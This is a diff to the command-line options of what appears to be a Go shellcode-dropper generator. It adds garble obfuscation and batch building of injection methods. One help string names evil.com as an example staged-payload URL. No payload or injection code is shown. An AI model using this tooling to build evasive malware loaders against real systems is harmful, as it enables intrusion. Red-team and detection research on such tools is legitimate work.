@@ -18,9 +18,11 @@ var stagerurl string
 var hostname string
 var imgpath string
 var ua string
-var debug bool
+var garble bool
 var shared bool
 var arch bool
+var initex bool
+var batch bool
 var time int
 
 const sgn = false
@@ -63,9 +65,9 @@ func init() {
 	newCmd.PersistentFlags().IntVarP(&time, "time", "t", 1, "delay in seconds before decryption and execution of shellcode.")
 	newCmd.PersistentFlags().StringVarP(&domain, "domain", "d", "", "")
 	newCmd.PersistentFlags().BoolVarP(&shared, "shared", "s", false, "Export dropper as DLL. Default is false")
-	newCmd.PersistentFlags().BoolVar(&debug, "debug", false, "Keep source files etc after compilation.")
 	newCmd.PersistentFlags().BoolVar(&arch, "32", false, "Attempts to generate an x86 dropper, completely untested. Use at own risk.")
-	newCmd.PersistentFlags().BoolVar(&arch, "gobuild", false, "Builds the dropper using go's built-in compiler.")
+	newCmd.PersistentFlags().BoolVar(&garble, "garble", false, "Builds the dropper using garble.")
+	newCmd.PersistentFlags().BoolVar(&batch, "batch", false, "[experimental] Builds all possible injection methods for dropper type.")
 
 	//Stager commands for all droppers.
 	newCmd.PersistentFlags().StringVarP(&stagerurl, "url", "u", "", "URL to use for a staged payload. E.g. https://evil.com/test.png. Setting this flag will make the payload staged.")
